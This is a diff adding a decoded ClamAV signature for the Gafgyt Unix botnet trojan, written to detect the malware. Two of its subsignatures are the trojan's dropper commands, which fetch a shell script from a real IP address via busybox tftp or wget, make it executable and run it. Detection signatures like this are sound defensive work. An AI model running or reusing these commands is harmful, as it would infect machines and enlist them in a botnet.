@@ -1,0 +1,28 @@
+VIRUS NAME: Unix.Trojan.Gafgyt-6981157-0
+TDB: Engine:51-255,Target:6
+LOGICAL EXPRESSION: (0|1)&(2&3&4)
+ * SUBSIG ID 0
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+cd /tmp; /bin/busybox tftp -g -l aiSHxd -r ab.sh 185.244.25.229; /bin/busybox chmod 777 aiSHxd; sh /tmp/aiSHxd
+ * SUBSIG ID 1
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+cd /tmp; /bin/busybox wget http://185.244.25.229/sh.sh -O - > jeSjax; /bin/busybox chmod 777 jeSjax; sh /tmp/jeSjax
+ * SUBSIG ID 2
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+i.4562
+ * SUBSIG ID 3
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+ipState.5324
+ * SUBSIG ID 4
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+C.258.6055
